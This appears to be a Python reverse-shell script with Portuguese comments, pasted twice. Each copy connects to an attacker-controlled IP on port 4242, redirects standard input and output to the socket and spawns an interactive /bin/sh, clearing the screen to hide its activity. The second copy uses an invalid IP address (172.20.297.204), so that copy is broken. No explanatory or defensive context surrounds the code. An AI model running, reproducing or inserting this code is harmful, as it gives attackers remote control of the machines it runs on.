
#----------------------------------
# Exporte rhost {attacker ip}.

from socket import SOCK_STREAM, socket, AF_INET
from os import dup2, system
from subprocess import call

rhost = '172.18.199.32' # Aqui o seu ip.

def reverse():
    so = socket(AF_INET, SOCK_STREAM)
    so.connect((rhost,4242))
    dup2(so.fileno(),0)
    dup2(so.fileno(),1)
    dup2(so.fileno(),2)
    call(["/bin/sh","-i"])


try:
    system('cls||clear')
    reverse()
except:
    system("cls||clear")
    exit()
reverse()
#----------------------------------
# Exporte rhost {attacker ip}.

from socket import SOCK_STREAM, socket, AF_INET
from os import dup2, system
from subprocess import call

rhost = '172.20.297.204' # Aqui o seu ip.

def reverse():
    so = socket(AF_INET, SOCK_STREAM)
    so.connect((rhost,4242))
    dup2(so.fileno(),0)
    dup2(so.fileno(),1)
    dup2(so.fileno(),2)
    call(["/bin/sh","-i"])


try:
    system('cls||clear')
    reverse()
except:
    system("cls||clear")
    exit()
reverse()
